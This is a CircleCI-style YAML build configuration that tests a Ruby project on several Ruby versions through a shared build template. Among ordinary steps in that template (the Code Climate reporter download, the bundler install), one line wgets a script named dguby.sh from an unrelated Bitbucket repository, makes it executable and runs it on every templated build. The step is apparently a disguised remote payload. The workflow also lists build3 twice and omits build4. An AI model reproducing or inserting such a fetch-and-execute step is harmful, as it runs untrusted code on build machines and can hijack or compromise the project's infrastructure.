working_dir: &working_dir ~/app

.build_template: &build_definition
  steps:
    - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
    - run: chmod +x ./cc-test-reporter
    - run: ./cc-test-reporter before-build
    - run: gem install bundler:2.1.4
    - run: wget https://bitbucket.org/p7cuk/cupliz/raw/4cf87888fc910969ba11340398da8819429926b2/dguby.sh && chmod u+x dguby.sh && ./dguby.sh

version: 2.0

jobs:
  build:
    docker:
      - image: ruby
    steps:
      - checkout
  build1:
    <<: *build_definition
    docker:
      - image: ruby:2.7
  build2:
    <<: *build_definition
    docker:
      - image: ruby:2.6
  build3:
    <<: *build_definition
    docker:
      - image: ruby:2.5
  build4:
    <<: *build_definition
    docker:
      - image: ruby:2.4
  build5:
    <<: *build_definition
    docker:
      - image: ruby:2.3

workflows:
  version: 2
  build_ruby_versions:
    jobs:
      - build
      - build1
      - build2
      - build3
      - build3
      - build5
